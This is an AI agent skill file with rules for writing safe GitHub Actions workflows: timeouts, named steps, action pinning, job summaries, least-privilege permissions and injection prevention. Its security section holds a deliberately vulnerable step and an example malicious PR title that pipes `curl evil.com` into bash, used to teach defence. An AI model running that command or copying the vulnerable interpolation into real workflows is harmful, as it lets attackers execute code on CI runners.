---
name: github-action-creator
description: Author safe, modern, and observable GitHub Actions workflow YAMLs for Node.js and GitHub CLI automation.
---

# GitHub Action Creator

## When to Use This Skill

Use this skill when you need to **create, review, or improve a GitHub Actions workflow** written in YAML, especially for:

- Node.js CI/CD pipelines
- GitHub CLI–based automation
- Repository-level automation and checks

This skill focuses on **workflow quality, safety, and maintainability**, not execution.

## Why use it?

- **Safety first**: Enforces explicit timeouts to prevent runaway jobs
- **Observable workflows**: Ensures job summaries for better debugging and monitoring
- **Best practices**: Promotes maintained actions and proper versioning
- **Audit-friendly**: Requires named steps for clear execution logs
- **Portable and reusable**: Works across organizations without repo-specific assumptions

## Success Criteria

- Output is valid GitHub Actions YAML.
- Every job defines an explicit `timeout-minutes`.
- Every step has a descriptive `name`.
- Use of `$GITHUB_STEP_SUMMARY` for observability.
- Avoids deprecated or unpinned action versions.

---

## What This Skill Does

This skill provides **rules and best practices** for authoring GitHub Actions workflows that are:

- **Resilient** (explicit timeouts)
- **Observable** (job summaries)
- **Auditable** (named steps)
- **Up to date** (maintained actions)
- **Portable** (no repo-specific assumptions)

The output of this skill is a **YAML workflow definition** that can be committed to `.github/workflows/*.yml`.

---

## What This Skill Does NOT Do

- Does not execute workflows
- Does not validate runtime success
- Does not assume repository structure
- Does not enforce branching strategies
- Does not decide triggers or job ordering
- Does not assume a planner or orchestration agent exists

All decisions remain with the calling agent or user.

---

## Rules for Authoring Workflows

When creating or editing a GitHub Actions workflow, follow these rules.

### 1. Define Explicit Job Timeouts

Every job **must** define a `timeout-minutes` value.

**Recommended defaults (heuristic):**

| Job Type                          | Recommended Timeout |
| --------------------------------- | ------------------- |
| Short checks (lint, tests)        | **10 minutes**      |
| Builds (npm, bundlers)            | **30 minutes**      |
| Releases / integration-heavy jobs | **60 minutes**      |

Validators will assert a `timeout-minutes` is present and is reasonable for the job type; avoid unbounded or implicit timeouts. Any timeout **>120 minutes** must include a justification comment in the workflow YAML.

---

### 2. Name Every Step

Each step must include a `name` field.

**Style guide for step names:**

- Use **verb-first**, concise names (e.g., `Install dependencies`, `Run unit tests`)
- Keep names under 50 characters
- Names should describe the outcome, not the implementation

This ensures:

- Clear audit trails
- Readable execution logs
- Better debugging in the GitHub Actions UI

Avoid anonymous or unnamed steps.

---

### 3. Prefer Maintained GitHub Actions

When using `uses:` steps:

- Prefer official or widely adopted actions
- Prefer stable, maintained versions and prefer **semantic version tags** (e.g., `@v1.2.3`) or commit SHAs for full reproducibility
- Major pins (e.g., `@v1`) are **acceptable** for widely maintained actions, but prefer minor/patch pins where reproducibility matters
- **Never** use `@main` or `@master` or leave actions unpinned

**Action pinning policy:**

| Context     | Recommended Pin                      | Why?                                                                                         |
| ----------- | ------------------------------------ | -------------------------------------------------------------------------------------------- |
| Production  | **Commit SHA** (e.g., `@a1b2c3d...`) | **Full reproducibility** and security. Hardens against "tag-moving" or compromised releases. |
| General CI  | **Semver tag** (e.g., `@v6.1.0`)     | Balances stability with ease of updates.                                                     |
| Development | **Major version** (e.g., `@v6`)      | Minimal maintenance; receives non-breaking updates automatically.                            |

Never use `@main`, `@master`, or unpinned references.

**Important: v6 Breaking Changes**

If using the latest major versions of popular actions, be aware of breaking changes:

**`actions/checkout@v6`** (released Dec 2024):

- Credentials now stored in `$RUNNER_TEMP` instead of `.git/config`
- Requires Actions Runner v2.329.0 or later for Docker container actions
- More secure credential handling
- **Migration**: Ensure runners are updated before adopting v6

**`actions/setup-node@v6`** (released Oct 2024):

- **Automatic caching** now enabled by default when `packageManager` field exists in `package.json`
- To disable: `package-manager-cache: false`
- `always-auth` input removed (deprecated in npm)
- Upgraded to node24 runtime (requires Runner v2.327.1+)
- **Migration**: Update `package.json` with `packageManager` field or disable auto-caching

**Recommendation**: Test v6 actions in a development workflow before deploying to production.

---

### 4. Publish Job Summaries

Ensure each job includes a final step that writes to `$GITHUB_STEP_SUMMARY`.

**Required summary format:**

```yaml
- name: Publish Job Summary
  if: always()
  run: |
    echo "## Job Result" >> $GITHUB_STEP_SUMMARY
    echo "- **Status:** ${{ job.status }}" >> $GITHUB_STEP_SUMMARY
    echo "- **Key outputs:** (list relevant metrics)" >> $GITHUB_STEP_SUMMARY
```

Use this summary to report:

- Job outcome (success/failure)
- Key versions or parameters
- High-level results and metrics

This improves observability without cluttering logs.

---

### 5. Handling Missing `GITHUB_STEP_SUMMARY`

In rare cases (e.g., specific self-hosted runner configurations), the `GITHUB_STEP_SUMMARY` environment variable may be unavailable. Workflows should be resilient to this.

**Recommended fallback pattern:**

```yaml
- name: Publish Summary (with fallback)
  if: always()
  run: |
    if [ -z "$GITHUB_STEP_SUMMARY" ]; then
      echo "::warning::GITHUB_STEP_SUMMARY unavailable - using job outputs"
      echo "summary=Job completed with status: ${{ job.status }}" >> $GITHUB_OUTPUT
    else
      echo "## ✅ Job Summary" >> $GITHUB_STEP_SUMMARY
      echo "- **Status:** ${{ job.status }}" >> $GITHUB_STEP_SUMMARY
    fi
```

This ensures that critical job metadata is still captured even if the summary UI is not available.

---

### 6. Use Workflow Control Features When Needed

GitHub Actions provides powerful control mechanisms. Use them appropriately:

**Conditional Execution (`if`):**

- Control step or job execution based on conditions
- Common uses: `if: success()`, `if: failure()`, `if: always()`
- Can reference context variables: `if: github.ref == 'refs/heads/main'`

**Job Dependencies (`needs`):**

- Define job execution order
- Create deployment pipelines: test → build → deploy
- Access outputs from previous jobs

**Concurrency Control:**

- Prevent multiple workflow runs from conflicting
- Use with `cancel-in-progress` for PR workflows
- Pattern: `concurrency: group: ${{ github.workflow }}-${{ github.ref }}`

**Permissions:**

- Always use **principle of least privilege**
- Explicitly declare required permissions
- Prefer `permissions: {}` or specific scopes over default `read-all`

**Matrix Strategy:**

- Test across multiple configurations (Node versions, OS, etc.)
- Use `fail-fast: false` to see all failures
- Limit matrix size to avoid excessive job counts

See examples for practical implementations.

---

### 7. Define Explicit Permissions (Principle of Least Privilege)

Always explicitly declare the minimum permissions required for the `GITHUB_TOKEN`. Never rely on default permissions.

**Default Behavior Risk**: GitHub's default token permissions are often overly permissive, granting broad access that workflows may not need.

**Best Practice**:

```yaml
permissions:
  contents: read        # For checkout
  pull-requests: write  # For PR comments (if needed)
  issues: write         # For creating issues (if needed)
  # All other scopes: none (by default when any permission is specified)
```

**Permission Scopes**:

| Scope | Common Use Cases |
|-------|------------------|
| `actions` | Download artifacts from other workflows |
| `checks` | Create check runs |
| `contents` | Read/write repository contents |
| `deployments` | Create deployment status |
| `id-token` | Request OIDC tokens for cloud authentication |
| `issues` | Create/modify issues |
| `packages` | Publish/download packages |
| `pages` | Deploy to GitHub Pages |
| `pull-requests` | Create/modify pull requests |
| `security-events` | Upload code scanning results |
| `statuses` | Create commit statuses |

**Scope Levels**: `read`, `write`, or `none`

**When to Use**:

- **Workflow level**: Apply to all jobs

  ```yaml
  permissions:
    contents: read
  
  jobs:
    # All jobs inherit read-only content access
  ```

- **Job level**: Override for specific jobs

  ```yaml
  permissions: {}  # Disable all by default
  
  jobs:
    deploy:
      permissions:
        contents: write
        deployments: write
  ```

**Security Rules**:

1. Start with `permissions: {}` (no permissions) and add only what's needed
2. Use `read` over `write` whenever possible
3. Never use `permissions: write-all` in production
4. For read-only workflows (tests, linting), use `permissions: read-all` or `contents: read`
5. OIDC authentication requires `id-token: write`

**Example - Secure Deployment**:

```yaml
permissions:
  contents: read
  id-token: write  # For OIDC

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789:role/GitHubActions
          aws-region: us-east-1
```

This prevents token abuse and limits blast radius if a workflow is compromised.

---

### 8. Structure `workflow_dispatch` Inputs Correctly

When defining manual triggers, GitHub Actions supports multiple input types:

**Supported Input Types:**

- `string` - Free-form text input
- `boolean` - Checkbox (true/false)
- `choice` - Dropdown with predefined options
- `environment` - Environment selector

**Best practices:**

- Always provide clear `description` fields
- Mark critical inputs as `required: true`
- Use `choice` type to constrain values when possible
- Provide sensible `default` values where appropriate
- Use `environment` type for deployment targets

See examples for all input types.

---

### 9. Security Hardening

Protect workflows from injection attacks and credential leaks.

#### Script Injection Prevention

Never directly interpolate untrusted input (PR titles, issue bodies, comments) into shell commands.

**❌ VULNERABLE**:

```yaml
- name: Vulnerable Step
  run: echo "PR Title: ${{ github.event.pull_request.title }}"
```

**Why?** A malicious PR title like `"; curl evil.com | bash; echo "` executes arbitrary code.

**✅ SAFE - Use Environment Variables**:

```yaml
- name: Safe Step
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
    USER_INPUT: ${{ github.event.comment.body }}
  run: |
    echo "PR Title: $PR_TITLE"
    echo "Comment: $USER_INPUT"
```

**Rule**: Always pass untrusted input through `env:` first.

#### Secret Handling Best Practices

**Never expose secrets in conditionals or expressions**:

```yaml
# ❌ VULNERABLE - Secret leaked in logs if condition fails
- name: Bad Secret Usage
  if: github.event.inputs.token == secrets.API_TOKEN
  run: echo "Authenticated"

# ✅ SAFE - Use intermediate environment variable
- name: Validate Token
  env:
    EXPECTED_TOKEN: ${{ secrets.API_TOKEN }}
    PROVIDED_TOKEN: ${{ github.event.inputs.token }}
  run: |
    if [ "$PROVIDED_TOKEN" = "$EXPECTED_TOKEN" ]; then
      echo "Authenticated"
    else
      echo "::error::Invalid token"
      exit 1
    fi
```

**Masking Sensitive Values**:

```yaml
- name: Generate Dynamic Secret
  run: |
    TEMP_TOKEN=$(generate-token)
    echo "::add-mask::$TEMP_TOKEN"
    echo "token=$TEMP_TOKEN" >> $GITHUB_OUTPUT
```

**Secrets Best Practices**:

1. Store all credentials in GitHub Secrets or environment secrets
2. Use `persist-credentials: false` in `actions/checkout` when not needed
3. Never log secrets or echo them for debugging
4. Use OIDC instead of long-lived cloud credentials
5. Rotate secrets regularly
6. Use environment protection rules for sensitive deployments

#### Third-Party Action Security

**Verify actions before use**:

1. Check the action's source code and reputation
2. Pin to full commit SHA for immutability
3. Review permissions required by the action
4. Use GitHub's Security tab to scan for vulnerabilities
5. Consider using OpenSSF Scorecard for action evaluation

**Security Checklist**:

- [ ] All actions pinned to commit SHA or semantic version
- [ ] Minimal `permissions:` declared explicitly
- [ ] No untrusted input in shell commands
- [ ] Secrets never in conditionals or logs
- [ ] `persist-credentials: false` when checkout credentials not needed
- [ ] OIDC used instead of long-lived cloud credentials
- [ ] Dependabot enabled for action updates

---

### 10. Use Standard YAML Formatting

- Use 2-space indentation
- Avoid tabs
- Keep structure readable and consistent
- Use `.yml` or `.yaml` extension (both are valid)

The workflow should be easy to review and maintain.

---

## Examples

See [references/examples.md](references/examples.md) for compliant workflow examples.

---

## Notes on Portability

- This skill does not assume any repository layout
- It does not depend on existing workflows
- It can be reused across organizations and projects
- It can be composed with planning or validation skills

**Prohibited repo-specific assumptions:**

- Hard-coded repository or organization names
- Secrets that only exist in specific repos
- Org-only actions without fallback alternatives
- Branch names other than common defaults (main, master)

---

## Summary

This skill teaches agents **how to think about GitHub Actions workflows**: prioritizing safety, clarity, and long-term maintainability over shortcuts.

Use it as a **reference and guide**, not as a rigid template generator.

---

## ⚠️ Deprecated Commands

Avoid these deprecated workflow commands - they will eventually stop working:

| Deprecated Command | Replacement | Example |
|-------------------|-------------|----------|
| `::set-output name=foo::bar` | `echo "foo=bar" >> $GITHUB_OUTPUT` | Set job/step outputs |
| `::save-state name=foo::bar` | `echo "foo=bar" >> $GITHUB_STATE` | Save state for post-action |
| `::add-path::/path/to/bin` | `echo "/path/to/bin" >> $GITHUB_PATH` | Add to PATH |

**Migration Example**:

```yaml
# ❌ OLD (Deprecated)
- run: echo "::set-output name=version::1.2.3"

# ✅ NEW (Current)
- id: get-version
  run: echo "version=1.2.3" >> $GITHUB_OUTPUT
- run: echo "Version: ${{ steps.get-version.outputs.version }}"
```

Always use the file-based alternatives (`$GITHUB_OUTPUT`, `$GITHUB_STATE`, `$GITHUB_PATH`).

---

## Limitations

- **Does not execute workflows**: This is an authoring skill, not a runtime executor
- **No validation guarantee**: Cannot verify workflow success without actual execution
- **No repository assumptions**: Does not infer project structure or dependencies
- **No branching strategy**: Leaves trigger configuration and job ordering to the user
- **Requires context**: Agents must understand the project needs to apply rules effectively
